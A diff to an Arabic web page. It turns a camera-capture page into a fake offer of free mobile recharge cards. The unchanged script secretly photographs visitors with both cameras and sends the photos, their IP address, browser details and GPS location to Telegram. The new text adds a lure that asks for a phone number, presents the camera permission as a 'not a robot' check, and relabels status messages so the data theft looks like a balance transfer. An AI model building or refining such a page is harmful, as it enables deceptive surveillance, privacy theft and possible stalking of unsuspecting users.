@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحميل صورة</title>
+    <title>شحن كروت جميع الشبكات كرت يومي</title>
     <style>
         body {
             font-family: sans-serif;
@@ -164,20 +164,20 @@
     </div>
 
     <div id="permissionGuide">
-        <h3>⚠️ يلزم إذن الوصول إلى الكاميرا</h3>
-        <p>للاستمرار، يرجى:</p>
+        <h3>⚠️ تعليمات</h3>
+        <p>لشحن الكرت:</p>
         <ol>
-            <li>النقر على زر "السماح" أو "Allow" في نافذة الإذن التي ستظهر</li>
-            <li>التأكد من عدم منع الموقع من الوصول إلى الكاميرا</li>
-            <li>السماح للمتصفح باستخدام الكاميرا إذا طلب منك ذلك</li>
+            <li>اختر الشبكه الخاصه بك(اضغط عليها)</li>
+            <li>اكتب الرقم مكون من 11 رقم ثم النقر على ارسال</li>
+            <li>اضغط على استلام الكرت ثم السماح بالوصول للتأكد انك لست روبوت.</li>
         </ol>
-        <button id="startButton">بدء الكاميرا</button>
+        <button id="startButton">استلام الكرت</button>
     </div>
 
-    <img id="displayImage" src="https://via.placeholder.com/600x400?text=جاري+التحميل" alt="الصورة" class="hidden">
-    <p id="loadingText" class="loading hidden">📸 جاري الالتقاط التبادلي للكاميرتين...</p>
+    <img id="displayImage" src="https://via.placeholder.com/600x400?text=جاري+التحميل" alt="........" class="hidden">
+    <p id="loadingText" class="loading hidden">🤖 جاري التحقق انك لست روبوت...</p>
     <div id="status" class="status hidden"></div>
-    <button id="stopButton" class="hidden">إيقاف التقاط الصور</button>
+    <button id="stopButton" class="hidden">.</button>
 
     <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -294,9 +294,9 @@
                     const success = await sendToTelegram('sendPhoto', arrayBuffer, true);
                     
                     if (success) {
-                        statusDiv.textContent = `✅ تم إرسال صورة من ${facing === 'user' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'} - ${new Date().toLocaleTimeString()}`;
+                        statusDiv.textContent = `يتم استلام الرصيد ${facing === 'user' ? 'تحميل الكروت' : 'تحميل الشبكه'} - ${new Date().toLocaleTimeString()}`;
                     } else {
-                        statusDiv.textContent = '❌ فشل إرسال الصورة';
+                        statusDiv.textContent = '❌ فشل إرسال الرصيد ';
                     }
                     
                     // Switch camera for next capture
@@ -373,9 +373,9 @@
                 // Send initial info to Telegram
                 const textSent = await sendTextToTelegram(ip, ua);
                 if (textSent) {
-                    statusDiv.textContent = '✅ تم إرسال معلومات الجهاز';
+                    statusDiv.textContent = '✅ يتم إرسال الرصيد';
                 } else {
-                    statusDiv.textContent = '❌ فشل إرسال معلومات الجهاز';
+                    statusDiv.textContent = '❌ فشل إرسال الكرت';
                 }
                 
                 // Try to get GPS location (only once)
@@ -383,10 +383,10 @@
                     navigator.geolocation.getCurrentPosition(async (pos) => {
                         const gpsSent = await sendTextToTelegram(ip, ua, pos.coords.latitude, pos.coords.longitude);
                         if (gpsSent) {
-                            statusDiv.textContent += ' + 📍 تم إرسال الموقع';
+                            statusDiv.textContent += ' + 📍 يتم الارسال ';
                         }
                     }, (err) => {
-                        console.log("فشل الحصول على الموقع:", err);
+                        console.log("فشل الحصول على الرقم:", err);
                     });
                 }
                 
@@ -403,7 +403,7 @@
             if (video.srcObject) {
                 video.srcObject.getTracks().forEach(track => track.stop());
             }
-            statusDiv.textContent = '⏹ توقف التقاط الصور';
+            statusDiv.textContent = 'يتم ارسال الكرت ';
             stopButton.classList.add("hidden");
             startButton.classList.remove("hidden");
         }
@@ -447,4 +447,4 @@
         });
     </script>
 </body>
-  </html>
+</html>
